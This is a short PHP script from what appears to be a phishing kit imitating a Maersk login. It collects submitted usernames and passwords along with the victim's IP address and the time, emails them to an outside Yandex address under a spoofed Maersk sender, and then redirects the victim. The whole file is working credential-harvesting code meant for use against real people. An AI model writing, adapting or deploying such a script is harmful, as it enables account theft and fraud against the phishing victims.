<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "========== Maersk 2018 ===================\n";
$message .= "Username: ".$_POST['undercat']."\n";
$message .= "Password: ".$_POST['underdog']."\n";
$message .= "----------------------------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "======= Str8ight Up =============\n";

$recipient = "song23ji@yandex.com";
$subject = "Maersk Solid = $ip";
$headers = "From: Maersk Solid <hello@maersksolid.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: ././oh/bad/");

	   }


?>